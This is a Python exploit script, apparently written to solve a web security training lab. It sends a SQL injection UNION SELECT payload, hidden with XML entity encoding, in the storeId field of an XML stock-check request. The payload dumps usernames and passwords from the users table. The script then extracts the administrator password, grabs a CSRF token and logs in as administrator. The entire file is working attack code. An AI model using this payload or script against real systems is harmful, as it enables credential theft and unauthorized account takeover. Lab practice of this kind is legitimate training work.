import requests
import argparse
from urllib.parse import urlparse
from bs4 import BeautifulSoup
import re
import sys

parser = argparse.ArgumentParser()
parser.add_argument("url", help="the target's URL (eg: https://example.com)")
args = parser.parse_args()
input_url = args.url


def get_endpoint(url):
    # Extract the endpoint for the target URL
    url_parse = urlparse(url)
    endpoint = f"{url_parse.scheme}://{url_parse.netloc}/product/stock"
    return endpoint


def exploit(url):
    # Exploit the target URL to extract the administrator's password
    payload = "1 &#x55;NION &#x53;ELECT username || &apos;,&apos; || password FROM users"
    req_body = f'<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>{
        payload}</storeId></stockCheck>'

    try:
        response = requests.post(url, data=req_body)
        response.raise_for_status()
    except requests.exceptions.HTTPError as http_err:
        print("-"*50)
        print(f"{http_err}\nMake sure the host is up!!!")
        sys.exit(1)
    except requests.exceptions.RequestException as req_err:
        print("-" * 50)
        print(f"Request error occurred: {req_err}")
        sys.exit(1)

   # Extract and decode the XML response
    try:
        xml_data = response.content
        decoded_string = xml_data.decode("utf-8")
    except Exception as e:
        print(f"Error decoding response: {e}")
        sys.exit(1)

    # Extract the administrator's password using regex
    pattern = r'administrator,([^\n]+)\n'
    match = re.search(pattern, decoded_string)
    if match:
        return match.group(1)
    else:
        print("Failed to extract administrator password from response!!!")
        sys.exit(1)


def finish_lab(url):
    # Get the admin password
    endpoint = get_endpoint(url)
    admin_password = exploit(endpoint)

    # Finish the lab by logging in as the administrator
    login_url = f"{url}/login"
    session = requests.Session()

    try:
        page_content = session.get(login_url).text
    except requests.exceptions.RequestException as req_err:
        print(f"Request error occurred while fetching login page: {req_err}")
        sys.exit(1)

    # Extract CSRF token using BeautifulSoup
    try:
        bs = BeautifulSoup(page_content, "html.parser")
        csrf_token = bs.find("input", {"name": "csrf"}).get("value")
    except AttributeError as attr_err:
        print(f"Error extracting CSRF token: {attr_err}")
        sys.exit(1)

    # Attempt to log in as the administrator
    data = {'csrf': csrf_token, 'username': 'administrator',
            'password': admin_password}
    try:
        response = session.post(login_url, data=data)
    except requests.exceptions.RequestException as req_err:
        print(f"Request error occurred while logging in: {req_err}")
        sys.exit(1)

    return [response.status_code, admin_password]


def main():
    print("Exploiting target...")
    response = finish_lab(input_url)
    print("-"*50)
    print(f"Status Code: {response[0]}")
    print(f"Endpoint: {get_endpoint(input_url)}")
    print(f"Admin Password: {response[1]}")
    print("-"*50)
    if response[0] == 200:
        print("Exploiting Success!!!")
    else:
        print("Fail to exploit the target!!!")


if __name__ == "__main__":
    main()
